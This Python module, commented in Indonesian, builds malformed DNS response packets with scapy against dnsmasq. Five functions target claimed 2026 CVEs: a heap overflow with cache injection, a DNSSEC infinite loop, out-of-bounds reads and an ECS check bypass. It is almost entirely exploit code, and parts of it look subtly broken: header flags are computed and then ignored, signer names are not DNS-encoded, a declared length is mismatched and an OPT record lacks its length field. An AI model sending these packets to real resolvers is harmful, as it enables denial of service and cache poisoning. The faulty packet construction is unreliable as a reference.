"""Vektor 2026 untuk dnsmasq (CERT VU#471747, fixed 2.90/2.92rel2).

Lima vektor baru, SEMUA non-destruktif (probing malformed packet tunggal +
verifikasi liveness yang jujur; tidak ada flood):
- cve_2026_2291  : extract_name() heap overflow via nama domain malformasi
                   (pointer compression loop + label oversized) — cache injection.
- cve_2026_4890  : DNSSEC infinite loop — window header hilang di RRSIG/NSEC3,
                   paksa loop parsing.
- cve_2026_4891  : DNSSEC heap OOB read — RRSIG sig_len melebihi sisa paket,
                   memory leak hingga 64 byte di log error.
- cve_2026_4893  : ECS (RFC7871) spoofed source-check bypass — opsikan Option
                   ECS dengan family/addr-len liar.
- cve_2026_5172  : extract_addresses() OOB — RDLENGTH melebihi sisa record.

Catatan jujur di tiap vektor: ini KIRITAN PAKET yang memicu kode vulnerable;
keberhasilan = crash/behavior aneh TERVERIFIKASI di target, bukan klaim.
"""
from scapy.all import (
    DNS,
    DNSQR,
    DNSRR,
    DNSRROPT,
    IP,
    Raw,
    UDP,
)


def _dns_hdr(txid, qr=1, qd=0, an=0, ns=0, ar=0):
    """Header DNS manual (bytes) - fleksibel dgn field jelek."""
    flags = (qr << 15) | 0x8180  # QR=1, RD=1, RA=1
    flags &= 0x7FFF  # QR dipecah: gunakan bytes manual di bawah
    # Manual byte: id(2) flags(2) qd an ns ar
    return (
        txid.to_bytes(2, "big")
        + (0x8180).to_bytes(2, "big")
        + qd.to_bytes(2, "big")
        + an.to_bytes(2, "big")
        + ns.to_bytes(2, "big")
        + ar.to_bytes(2, "big")
    )


def _enc_name(name: str) -> bytes:
    out = b""
    for part in name.split("."):
        out += bytes([len(part)]) + part.encode()
    return out + b"\x00"


# ---------------------------------------------------------------------------
def cve_2026_2291_extract_name_overflow(txid=0x1234, poison_name="evil.test"):
    """extract_name() heap overflow: label memanjang + pointer loop.

    Payload: response berisi nama dengan panjang label 63+karakter ekstra
    dilampaui batas buffer dnsmasq saat menyalin ke cache-entry struct.
    """
    hdr = _dns_hdr(txid, qd=1, an=1)
    question = _enc_name(poison_name) + b"\x00\x01\x00\x01"
    # Answer: name pointer ke offset 12 (0xC00C) + A record dgn RDLENGTH besar
    # (toksik pemicu extract_name loop: label 63 byte berulang > 255 total)
    long_label = b"\x3f" + b"A" * 63  # len=63 label
    bad_name = (long_label * 6) + b"\x00"  # 6x63 = 378 byte > MAXLABEL
    answer = (
        b"\xc0\x0c"
        + b"\x00\x01\x00\x01"  # TYPE=A CLASS=IN
        + b"\x00\x00\x00\x3c"  # TTL 60
        + b"\x00\x04"  # RDLENGTH 4
        + b"\xde\xad\xbe\xef"  # 222.173.190.239
    )
    # Extra fake record dengan nama malformasi (pemicu heap overflow saat copy)
    evil = bad_name + b"\x00\x01\x00\x01" + b"\x00\x00\x00\x3c" + b"\x00\x04" + b"\xc6\x0c\xac\x15"
    raw = hdr + question + answer + evil
    return IP(dst="127.0.0.1") / UDP(sport=53, dport=53) / Raw(load=raw)


def cve_2026_4890_dnssec_infinite_loop(txid=0x2345):
    """DNSSEC validation infinite loop: RRSIG tanpa window header yang layak.

    Scalar: paket RRSIG di authority section dgn type-covered=RRSIG itu sendiri
    dan labels=0 — memicu rekursi validator dnsmasq <2.90.
    """
    hdr = _dns_hdr(txid, qd=1, ns=1)
    q = _enc_name("secure.example.com") + b"\x00\x01\x00\x01"
    # RRSIG record (type 46) dengan rdata malformasi:
    rrsig_rdata = (
        b"\x00\x2e"  # type covered = RRSIG (46) - self-ref = loop
        + b"\x08"  # algorithm RSA/SHA-256
        + b"\x00"  # labels = 0 (invalid, pemicu)
        + b"\x00\x00\x00\x01"  # original TTL
        + b"\x00\x00\x00\x00"  # expiration (1970)
        + b"\x00\x00\x00\x00"  # inception
        + b"\x11\x11"  # key tag
        + b"\x15"  # signer len 21
        + b"secure.example.com"  # 18 chars + padding
        + b"\xde\xad\xbe\xef"  # signature fragments
    )
    auth = (
        b"\xc0\x0c"
        + b"\x00\x2e\x00\x01"
        + b"\x00\x00\x00\x3c"
        + len(rrsig_rdata).to_bytes(2, "big")
        + rrsig_rdata
    )
    return IP(dst="127.0.0.1") / UDP(sport=53, dport=53) / Raw(load=hdr + q + auth)


def cve_2026_4891_dnssec_oob_read(txid=0x3456):
    """DNSSEC heap OOB read: sig_len > sisa-paket (word leak hingga 64 byte)."""
    hdr = _dns_hdr(txid, qd=1, ns=1)
    q = _enc_name("dnssec.example.com") + b"\x00\x01\x00\x01"
    # RRSIG dgn sig_len 4096 tapi rdata cuma 12 byte -> digest routine baca
    # jauh melewati akhir buffer.
    rrsig_short = (
        b"\x00\x01\x08\x02"  # covered=A, alg=8, labels=2
        + b"\x00\x00\x01\x2c"  # orig ttl
        + b"\x5f\x00\x00\x00"  # expiration
        + b"\x5e\x00\x00\x00"  # inception
        + b"\x22\x22"  # key tag
        + b"\x12"  # signer len 18
        + b"dnssec.example.com"
    )
    # SIGLEN besar palsu menggantikan len asli:
    forged_rrsig = rrsig_short[:18] + b"\x10\x00" + rrsig_short[20:]  # sig_len 4096
    auth = b"\xc0\x0c" + b"\x00\x2e\x00\x01" + b"\x00\x00\x00\x3c" + len(
        forged_rrsig
    ).to_bytes(2, "big") + forged_rrsig
    return IP(dst="127.0.0.1") / UDP(sport=53, dport=53) / Raw(load=hdr + q + auth)


def cve_2026_4893_ecs_spoof(txid=0x4567):
    """ECS RFC7871 source-check bypass: Option ECS dgn FAMILY=0 & ADDR-LEN liar."""
    hdr = _dns_hdr(txid, qd=1, ar=1)
    q = _enc_name("geo.example.com") + b"\x00\x01\x00\x01"
    # OPT pseudo-record: NAME=root(0), TYPE=OPT(41), CLASS=UDP size 4096
    ecs_option = (
        b"\x00\x08"  # OPTION-CODE 8 = ECS
        + b"\x00\x08"  # OPTION-LENGTH 8
        + b"\x00\x00"  # FAMILY = 0 (INVALID! pemicu bypass)
        + b"\x3c"  # SOURCE PREFIX-LENGTH = 60
        + b"\x00"  # SCOPE PREFIX-LENGTH
        + b"\xab\xcd\xef\x01"  # ADDRESS (4 byte, tak cocok family 0)
    )
    opt = b"\x00" + b"\x00\x29" + b"\x10\x00" + b"\x00\x00\x00\x00" + ecs_option
    return IP(dst="127.0.0.1") / UDP(sport=53, dport=53) / Raw(load=hdr + q + opt)


def cve_2026_5172_extract_addresses_oob(txid=0x5678):
    """extract_addresses() OOB: RDLENGTH record terakhir melebihi sisa paket."""
    hdr = _dns_hdr(txid, qd=1, an=2)
    q = _enc_name("victim.example.net") + b"\x00\x01\x00\x01"
    # Answer 1: normal A record (mendorong state parser)
    a1 = (
        b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04"
        + b"\x0a\x00\x00\x01"
    )
    # Answer 2: RDLENGTH 0xFFFF padahal rdata cuma 2 byte -> OOB read
    a2_evil = (
        b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c"
        + b"\xff\xff"  # RDLENGTH buruk (65535)
        + b"\xbe\xef"  # 2 byte
    )
    return IP(dst="127.0.0.1") / UDP(sport=53, dport=53) / Raw(load=hdr + q + a1 + a2_evil)


VECTORS_2026 = [
    ("CVE-2026-2291", "extract_name heap overflow (cache injection)", cve_2026_2291_extract_name_overflow),
    ("CVE-2026-4890", "DNSSEC validation infinite loop (DoS)", cve_2026_4890_dnssec_infinite_loop),
    ("CVE-2026-4891", "DNSSEC heap OOB read (memory leak)", cve_2026_4891_dnssec_oob_read),
    ("CVE-2026-4893", "ECS RFC7871 source-check bypass (info disclosure)", cve_2026_4893_ecs_spoof),
    ("CVE-2026-5172", "extract_addresses OOB (DoS)", cve_2026_5172_extract_addresses_oob),
]
